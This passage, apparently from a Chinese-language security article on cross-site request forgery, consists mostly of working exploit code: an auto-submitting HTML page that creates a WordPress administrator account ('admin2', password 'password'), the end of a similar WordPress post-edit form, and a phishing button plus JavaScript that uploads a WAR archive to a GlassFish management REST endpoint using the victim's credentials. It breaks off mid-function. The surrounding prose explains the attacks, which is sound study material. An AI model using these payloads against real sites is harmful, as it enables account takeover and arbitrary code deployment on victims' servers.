+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;ss&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;post_author&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;1&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;post_password&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;post_category%5B%5D&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;post_category%5B%5D&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;1&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;tax_input%5Bpost_tag%5D&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;comment_status&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;open&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;ping_status&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;open&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;_status&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;publish&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;post_format&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;_inline_edit&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&lt;sniffed_value&gt;&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;post_view&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;list&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;screen&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;edit-post&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;action&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;inline-save&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;post_type&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;post&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;post_ID&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;1&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;edit_date&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;true&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;post_status&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;all&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
+</span></span></code></pre></div><p>另一个测试用例时添加某个具有管理员权限的用户，测试用例为</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>body</span> <span class=na>onload</span><span class=o>=</span><span class=s>&#34;javascript:document.forms[0].submit()&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>h2</span><span class=p>&gt;</span>CSRF Exploit to add Administrator<span class=p>&lt;/</span><span class=nt>h2</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>form</span>
+</span></span><span class=line><span class=cl>      <span class=na>method</span><span class=o>=</span><span class=s>&#34;POST&#34;</span>
+</span></span><span class=line><span class=cl>      <span class=na>name</span><span class=o>=</span><span class=s>&#34;form0&#34;</span>
+</span></span><span class=line><span class=cl>      <span class=na>action</span><span class=o>=</span><span class=s>&#34;http://&lt;wordpress_ip&gt;:80/wp-admin/user-new.php&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;action&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;createuser&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span>
+</span></span><span class=line><span class=cl>        <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=na>name</span><span class=o>=</span><span class=s>&#34;_wpnonce_create-user&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=na>value</span><span class=o>=</span><span class=s>&#34;&lt;sniffed_value&gt;&#34;</span>
+</span></span><span class=line><span class=cl>      <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span>
+</span></span><span class=line><span class=cl>        <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=na>name</span><span class=o>=</span><span class=s>&#34;_wp_http_referer&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=na>value</span><span class=o>=</span><span class=s>&#34;%2Fwordpress%2Fwp-admin%2Fuser-new.php&#34;</span>
+</span></span><span class=line><span class=cl>      <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;user_login&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;admin2&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;email&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;admin2@admin.com&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;first_name&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;admin2@admin.com&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;last_name&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;url&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;pass1&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;password&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;pass2&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;password&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;role&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;administrator&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;createuser&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;Add+New+User+&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
+</span></span></code></pre></div><h2 id=oracle-glassfish-server---rest-cross-site-request-forgery>Oracle GlassFish Server - REST Cross-Site Request Forgery</h2><p>该漏洞是由 Security-Assessment.com 发现的，Oracle GlassFish 服务器的 REST 接口可以被 CSRF 请求攻击，譬如其可以允许普通用户任意上传 WAR 包，并且可以控制在服务端运行从而导致窃取其他运行应用的信息。关于具体的攻击复盘可以参考<a href=http://blog.kotowicz.net/2011/04/how-to-upload-arbitrary-file-contents.html target=_blank rel=noopener>这里</a>。其攻击手段是首先在钓鱼站点上设置如下按钮</p><pre tabindex=0><code>&lt;button id=&#34;upload&#34; onclick=&#34;start()&#34; type=&#34;button&#34;&gt;Upload WAR Archive&lt;/button&gt;
+</code></pre><p>然后添加如下脚本</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>logUrl</span> <span class=o>=</span> <span class=s1>&#39;http://glassfishserver/management/domain/applications/application&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>fileUpload</span><span class=p>(</span><span class=nx>fileData</span><span class=p>,</span> <span class=nx>fileName</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>fileSize</span> <span class=o>=</span> <span class=nx>fileData</span><span class=p>.</span><span class=nx>length</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=nx>boundary</span> <span class=o>=</span> <span class=s2>&#34;---------------------------270883142628617&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=nx>uri</span> <span class=o>=</span> <span class=nx>logUrl</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=nx>xhr</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>XMLHttpRequest</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>additionalFields</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>          <span class=nx>asyncreplication</span><span class=o>:</span> <span class=s2>&#34;true&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>          <span class=nx>availabilityenabled</span><span class=o>:</span> <span class=s2>&#34;false&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>          <span class=nx>contextroot</span><span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>createtables</span><span class=o>:</span> <span class=s2>&#34;true&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>dbvendorname</span><span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>deploymentplan</span><span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>description</span><span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>dropandcreatetables</span><span class=o>:</span> <span class=s2>&#34;true&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>enabled</span><span class=o>:</span> <span class=s2>&#34;true&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>force</span><span class=o>:</span> <span class=s2>&#34;false&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>generatermistubs</span><span class=o>:</span> <span class=s2>&#34;false&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>isredeploy</span><span class=o>:</span> <span class=s2>&#34;false&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>keepfailedstubs</span><span class=o>:</span> <span class=s2>&#34;false&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>keepreposdir</span><span class=o>:</span> <span class=s2>&#34;false&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>keepstate</span><span class=o>:</span> <span class=s2>&#34;true&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>lbenabled</span><span class=o>:</span> <span class=s2>&#34;true&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>libraries</span><span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>logReportedErrors</span><span class=o>:</span> <span class=s2>&#34;true&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>name</span><span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>precompilejsp</span><span class=o>:</span> <span class=s2>&#34;false&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>properties</span><span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>property</span><span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>retrieve</span><span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>target</span><span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>type</span><span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>uniquetablenames</span><span class=o>:</span> <span class=s2>&#34;true&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>verify</span><span class=o>:</span> <span class=s2>&#34;false&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>virtualservers</span><span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>__remove_empty_entries__</span><span class=o>:</span> <span class=s2>&#34;true&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>XMLHttpRequest</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>sendAsBinary</span> <span class=o>==</span> <span class=s2>&#34;function&#34;</span><span class=p>)</span> <span class=p>{</span> <span class=c1>// Firefox 3 &amp; 4
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kd>var</span> <span class=nx>tmp</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>fileData</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=nx>tmp</span> <span class=o>+=</span>
+</span></span><span class=line><span class=cl><span class=nb>String</span><span class=p>.</span><span class=nx>fromCharCode</span><span class=p>(</span><span class=nx>fileData</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=nx>i</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>fileData</span> <span class=o>=</span> <span class=nx>tmp</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=p>{</span> <span class=c1>// Chrome 9
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// http://javascript0.org/wiki/Portable_sendAsBinary
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>XMLHttpRequest</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>sendAsBinary</span> <span class=o>=</span> <span class=kd>function</span><span class=p>(</span><span class=nx>text</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>      <span class=kd>var</span> <span class=nx>data</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ArrayBuffer</span><span class=p>(</span><span class=nx>text</span><span class=p>.</span><span class=nx>length</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=kd>var</span> <span class=nx>ui8a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Uint8Array</span><span class=p>(</span><span class=nx>data</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>text</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=nx>ui8a</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=nx>text</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=nx>i</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>      <span class=kd>var</span> <span class=nx>bb</span> <span class=o>=</span> <span class=k>new</span> <span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>BlobBuilder</span> <span class=o>||</span> <span class=nb>window</span><span class=p>.</span><span class=nx>WebKitBlobBuilder</span><span class=p>)();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>      <span class=nx>bb</span><span class=p>.</span><span class=nx>append</span><span class=p>(</span><span class=nx>data</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=kd>var</span> <span class=nx>blob</span> <span class=o>=</span> <span class=nx>bb</span><span class=p>.</span><span class=nx>getBlob</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>      <span class=k>this</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>blob</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>fileFieldName</span> <span class=o>=</span> <span class=s2>&#34;id&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>xhr</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s2>&#34;POST&#34;</span><span class=p>,</span> <span class=nx>uri</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>xhr</span><span class=p>.</span><span class=nx>setRequestHeader</span><span class=p>(</span><span class=s2>&#34;Content-Type&#34;</span><span class=p>,</span> <span class=s2>&#34;multipart/form-data; boundary=&#34;</span><span class=o>+</span><span class=nx>boundary</span><span class=p>);</span> <span class=c1>// simulate a
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>file</span> <span class=nx>MIME</span> <span class=nx>POST</span> <span class=nx>request</span><span class=p>.</span>
+</span></span><span class=line><span class=cl>    <span class=nx>xhr</span><span class=p>.</span><span class=nx>setRequestHeader</span><span class=p>(</span><span class=s2>&#34;Content-Length&#34;</span><span class=p>,</span> <span class=nx>fileSize</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>xhr</span><span class=p>.</span><span class=nx>withCredentials</span> <span class=o>=</span> <span class=s2>&#34;true&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>xhr</span><span class=p>.</span><span class=nx>onreadystatechange</span> <span class=o>=</span> <span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=nx>xhr</span><span class=p>.</span><span class=nx>readyState</span> <span class=o>==</span> <span class=mi>4</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>((</span><span class=nx>xhr</span><span class=p>.</span><span class=nx>status</span> <span class=o>&gt;=</span> <span class=mi>200</span> <span class=o>&amp;&amp;</span> <span class=nx>xhr</span><span class=p>.</span><span class=nx>status</span> <span class=o>&lt;=</span> <span class=mi>200</span><span class=p>)</span> <span class=o>||</span> <span class=nx>xhr</span><span class=p>.</span><span class=nx>status</span> <span class=o>==</span> <span class=mi>304</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span><span class=nx>xhr</span><span class=p>.</span><span class=nx>responseText</span> <span class=o>!=</span> <span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>alert</span><span class=p>(</span><span class=nx>JSON</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=nx>xhr</span><span class=p>.</span><span class=nx>responseText</span><span class=p>).</span><span class=nx>msg</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>          <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>xhr</span><span class=p>.</span><span class=nx>status</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>body</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=k>in</span> <span class=nx>additionalFields</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=nx>additionalFields</span><span class=p>.</span><span class=nx>hasOwnProperty</span><span class=p>(</span><span class=nx>i</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>body</span> <span class=o>+=</span> <span class=nx>addField</span><span class=p>(</span><span class=nx>i</span><span class=p>,</span> <span class=nx>additionalFields</span><span class=p>[</span><span class=nx>i</span><span class=p>],</span> <span class=nx>boundary</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nx>body</span> <span class=o>+=</span> <span class=nx>addFileField</span><span class=p>(</span><span class=nx>fileFieldName</span><span class=p>,</span> <span class=nx>fileData</span><span class=p>,</span> <span class=nx>fileName</span><span class=p>,</span> <span class=nx>boundary</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>body</span> <span class=o>+=</span> <span class=s2>&#34;--&#34;</span> <span class=o>+</span> <span class=nx>boundary</span> <span class=o>+</span> <span class=s2>&#34;--&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>xhr</span><span class=p>.</span><span class=nx>sendAsBinary</span><span class=p>(</span><span class=nx>body</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>addField</span><span class=p>(</span><span class=nx>name</span><span class=p>,</span> <span class=nx>value</span><span class=p>,</span> <span class=nx>boundary</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>c</span> <span class=o>=</span> <span class=s2>&#34;--&#34;</span> <span class=o>+</span> <span class=nx>boundary</span> <span class=o>+</span> <span class=s2>&#34;\r\n&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>c</span> <span class=o>+=</span> <span class=s1>&#39;Content-Disposition: form-data; name=&#34;&#39;</span> <span class=o>+</span> <span class=nx>name</span> <span class=o>+</span> <span class=s1>&#39;&#34;\r\n\r\n&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>c</span> <span class=o>+=</span> <span class=nx>value</span> <span class=o>+</span> <span class=s2>&#34;\r\n&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>c</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>addFileField</span><span class=p>(</span><span class=nx>name</span><span class=p>,</span> <span class=nx>value</span><span class=p>,</span> <span class=nx>filename</span><span class=p>,</span> <span class=nx>boundary</span><span class=p>)</span> <span class=p>{</span>
